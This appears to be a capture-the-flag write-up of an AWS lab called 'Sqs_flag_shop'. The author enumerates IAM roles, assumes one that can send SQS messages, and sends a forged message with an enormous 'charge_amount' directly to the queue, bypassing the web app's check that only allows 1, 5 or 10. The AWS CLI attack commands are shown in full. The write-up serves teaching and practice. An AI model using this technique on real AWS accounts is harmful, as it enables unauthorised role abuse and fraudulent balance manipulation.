---------------

### Sqs_flag_shop

----------------

- Current user--:

```bash
aws sts get-caller-identity --profile <> | jq
```
<img width="756" height="168" alt="image" src="https://github.com/user-attachments/assets/6fb8dbe9-a03e-43f0-a5cd-02f9ff82c323" />

- I found this code in the backend of the web page-:

```python3
@app.route('/charge_cash/<cash>', methods=['POST'])
def charge_cash(cash):
    cash = int(cash)
    if cash==1 or cash==5 or cash==10:
        msg = {"charge_amount" : cash}
        message_body = json.dumps(msg)
        response = sqs.sqs_client.send_message(
          QueueUrl=sqs.sqs_queue_url, 
          MessageBody=message_body
        )
        time.sleep(10)
        return redirect(url_for('index'))
    else:
        return "BAD Request!!"
```

- I enumerated the roles and found this role.

<img width="942" height="393" alt="image" src="https://github.com/user-attachments/assets/017c9b94-a697-4388-a1d3-bab90ac6201c" />

- The current user can assume roles

<img width="1525" height="796" alt="image" src="https://github.com/user-attachments/assets/77e5d15c-4d58-4814-96fb-3017c8252e3a" />

- The role `` can get-queue-url and also send message over resource sqs url `cash-charge-queue`-:

<img width="1315" height="388" alt="image" src="https://github.com/user-attachments/assets/a95aaf8a-115d-46d3-b2c7-df40b87121ad" />

- Assuming the role-:

<img width="1920" height="352" alt="image" src="https://github.com/user-attachments/assets/24f493a0-576c-4504-a48e-095cb21ac668" />

- The source code shows the url requires json body-:

```json
{"charge_amount" : 1000000000000}
```

- Getting the url-:

```bash
aws sqs get-queue-url --queue-name cash_charging_queue --region us-east-1 --profile sqs_adminer | jq
```

<img width="1297" height="123" alt="image" src="https://github.com/user-attachments/assets/361cdbb3-9c46-401c-b1b9-760ab752ef55" />

- Send a message to the queue to increase cash

```bash
aws sqs send-message --queue-url "https://queue.amazonaws.com/XXXXXXXXXX/cash_charging_queue" --message-body '{"charge_amount": 100000000000000000000}' --region us-east-1 --profile sqs_adminer | jq
```

<img width="1162" height="172" alt="image" src="https://github.com/user-attachments/assets/449f2ed0-4408-4c58-ad33-045996d2e564" />


- Flaggie-:

<img width="1134" height="703" alt="image" src="https://github.com/user-attachments/assets/588ebfd7-644e-4914-9bef-f4212781bc90" />





